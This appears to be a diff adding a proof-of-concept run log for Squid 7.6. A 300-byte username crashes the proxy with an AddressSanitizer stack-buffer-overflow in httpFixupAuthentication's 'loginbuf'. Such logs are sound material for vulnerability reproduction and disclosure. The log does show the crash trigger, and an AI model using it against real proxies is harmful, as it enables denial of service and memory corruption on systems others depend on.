@@ -1,0 +1,17 @@
+Squid 7.6 (vulnerable); synthetic usernames
+[runner] baseline request
+[client] username bytes: 100
+[client] request: GET http://peerstub/poc HTTP/1.1
+[client] response: HTTP/1.1 200 OK
+[runner] long-username request
+[client] username bytes: 300
+[client] request: GET http://peerstub/poc HTTP/1.1
+[client] response: <no response>
+[runner] container: exited exit=1
+==1==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7e4bb1a86c7f at pc 0x5818bb066ece bp 0x7ffcbd925810 sp 0x7ffcbd925800
+WRITE of size 1 at 0x7e4bb1a86c7f thread T0
+    #0 0x5818bb066ecd in encode_raw /src/squid-7.6/lib/base64.c:202
+    #1 0x5818bb067a58 in base64_encode_update /src/squid-7.6/lib/base64.c:288
+    #2 0x5818ba9c4047 in httpFixupAuthentication /src/squid-7.6/src/http.cc:1848
+    [912, 1087) 'loginbuf' (line 1832) <== Memory access at offset 1151 overflows this variable
+SUMMARY: AddressSanitizer: stack-buffer-overflow /src/squid-7.6/lib/base64.c:202 in encode_raw
